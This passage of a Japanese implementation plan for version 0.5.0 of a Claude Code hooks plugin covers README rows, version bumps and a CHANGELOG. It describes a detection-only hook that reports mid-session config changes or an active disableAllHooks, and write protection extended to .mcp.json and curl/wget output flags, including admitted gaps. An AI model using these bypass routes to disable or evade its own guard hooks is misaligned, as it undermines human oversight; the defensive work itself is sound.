| [config_guard](docs/hooks/config_guard.md) | ConfigChange | 検知専用: セッション中の設定変更(および `disableAllHooks` の有効化)を `systemMessage` で可視化。書込保護が見えない経路でガードが黙って無効化されることを防ぐ。 |
```

`README.md`(英語)も同じ4点を更新。冒頭 `A collection of 8` → `A collection of 9`、`That enables all 8 hooks` → `all 9 hooks`。secrets_guard 行は `(.claude-hooks.json, .claude/settings.json, .mcp.json, .claude.json, the installed hooks/ and rules/)` とし `— covers shell mutations and curl/wget output flags; reads still allowed.` に。テーブル追加行:

```markdown
| [config_guard](docs/hooks/config_guard.md) | ConfigChange | Detection-only: surfaces any mid-session settings change (and an active `disableAllHooks`) via a system message, so guards can't be silently disabled through paths write-protection can't see. |
```

- [ ] **Step 6: 検証とコミット**

Run: `uv run pytest -q && uv run ruff check .`
Expected: 201 passed / All checks passed!

```bash
git add docs/ README.md README.ja.md
git commit -m "docs: 0.5.0ハードニング(write_protected拡張・config_guard)を反映

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 6: バージョン 0.5.0 と CHANGELOG

**Files:**
- Modify: `pyproject.toml:3`(version)
- Modify: `.claude-plugin/plugin.json`(version)
- Modify: `CHANGELOG.md`(先頭に `[0.5.0]` セクション)

**Interfaces:**
- Consumes: Task 1〜5 の全変更
- Produces: リリース 0.5.0

- [ ] **Step 1: バージョンを更新**

`pyproject.toml` を Edit: `version = "0.4.0"` → `version = "0.5.0"`。
`.claude-plugin/plugin.json` を Edit: `"version": "0.4.0"` → `"version": "0.5.0"`(実際のキー位置はファイルを Read して確認)。

- [ ] **Step 2: CHANGELOG に 0.5.0 セクションを追加**

`CHANGELOG.md` の `## [0.4.0] - 2026-07-19` の直前に挿入:

```markdown
## [0.5.0] - 2026-07-20

### Added

- **`config_guard`(新Hook / `ConfigChange`)** — セッション中の設定ファイル変更(user/project/local/policy/skills)を `systemMessage` で通知し、変更後に `disableAllHooks: true` が有効な場合は追加警告する検知専用フック。write_protected(予防層)が見えない経路 — インタプリタレベルの書込・外部プロセス・人間の手による編集 — での設定変更を可視化する。ブロックはしない(`disableAllHooks` という正規の解除手段、および人間自身の設定編集を妨げないため。warn→block 段階導入の原則)。設定キー `config_guard.enabled`(警告専用のため `false` で完全無効化可)。`audit_log` も `ConfigChange` に配線し監査ログへ記録する。

### Changed

- **`secrets_guard`: write_protected に `.mcp.json`・`.claude.json` を追加** — MCPサーバ定義の `command` は任意コマンド実行経路であり、フック定義(`settings.json`)と同格の改変標的となるため(Claude Code のプロジェクト設定ファイル群を攻撃面とした CVE-2025-59536 / CVE-2026-21852 の教訓。`docs/best-practices.md` セクション6.2)。
- **`secrets_guard`: `curl`/`wget` の出力フラグによる書込を write_protected の検査対象に追加** — `-o`(バンドル末尾 `-fsSLo`・密着引数 `-oFILE` を含む)/`--output`、wget の `-O`/`--output-document`(`=` 連結形式を含む)の引数トークンを保護対象と照合し、ダウンロードによる設定/フックファイルの上書きを deny する。出力フラグの引数のみを照合するため、読取用途の `curl`(URL に保護ファイル名を含む場合など)や `/tmp` への保存は妨げない。`curl -O`・裸の `wget URL` のようにファイル名がURL側から決まる形式は対象外(既知の限界としてドキュメント化)。

```

- [ ] **Step 3: 最終検証とコミット**

Run: `uv run pytest -q && uv run ruff check .`
Expected: 201 passed / All checks passed!

```bash
git add pyproject.toml .claude-plugin/plugin.json CHANGELOG.md
git commit -m "chore(release): 0.5.0

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

- [ ] **Step 4: `.superpowers/` の一時スクリプトを削除(gitignore 済みだが後片付け)**

Run: `python3 -c "import shutil; shutil.rmtree('.superpowers', ignore_errors=True)"`
